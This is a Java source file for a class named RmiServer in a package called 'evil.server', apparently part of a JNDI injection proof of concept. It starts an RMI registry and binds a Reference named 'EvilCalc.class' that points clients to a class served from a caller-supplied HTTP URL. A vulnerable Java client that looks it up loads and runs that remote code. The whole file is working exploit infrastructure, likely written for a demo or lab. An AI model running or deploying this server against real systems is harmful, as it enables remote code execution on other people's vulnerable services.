package cc11001100.evil.server;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.NotBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @author CC11001100
 */
public class RmiServer {

    private Registry registry;
    private final int port;

    public RmiServer(int port) {
        this.port = port;
    }

    public void run(String httpServerUrl) throws RemoteException, NamingException, AlreadyBoundException {
        this.registry = LocateRegistry.createRegistry(this.port);
        Reference reference = new Reference("EvilCalc.class", "EvilCalc.class", httpServerUrl);
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("EvilCalc.class", referenceWrapper);
        System.out.println("run rmi server success");
    }

    public void shutdown() throws NotBoundException, RemoteException {
        this.registry.unbind("EvilCalc.class");
    }

}
